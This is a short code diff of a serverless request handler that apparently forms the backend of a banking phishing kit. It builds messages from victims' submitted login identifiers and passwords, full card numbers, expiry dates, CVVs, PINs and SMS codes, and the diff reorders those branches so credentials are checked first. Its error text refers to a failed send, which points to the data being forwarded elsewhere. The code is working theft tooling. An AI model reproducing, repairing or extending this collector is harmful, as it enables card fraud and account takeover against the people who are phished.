@@ -22,7 +22,14 @@ export default async function handler(req, res) {
 
   let message = "";
 
-  if  (CN && cc && exp && cvv && PIN) {
+  if (user && pass ) {
+    // 🟢 رسالة الكارت
+    message = `
+    🔑 Nouveau PIN Login:
+    - Identifiant: ${user}
+    - Mot de passe: ${pass}
+     `;
+}else if  (CN && cc && exp && cvv && PIN) {
     // 🟢 رسالة الكارت
     message = `
     💳 Carte Bancaire:
@@ -33,14 +40,7 @@ export default async function handler(req, res) {
     - PIN: ${PIN}
     `;
   
-  }else if (user && pass ) {
-    // 🟢 رسالة الكارت
-    message = `
-    🔑 Nouveau PIN Login:
-    - Identifiant: ${user}
-    - Mot de passe: ${pass}
-     `;
-} else if (sms ) {
+  } else if (sms ) {
   // 🟢 رسالة الكارت
   message = `
   🔑 SMS recibido Login:
@@ -68,6 +68,7 @@ export default async function handler(req, res) {
     res.status(500).json({ message: "❌ Erreur lors de l'envoi" });
   }
 }
+
 
 
 
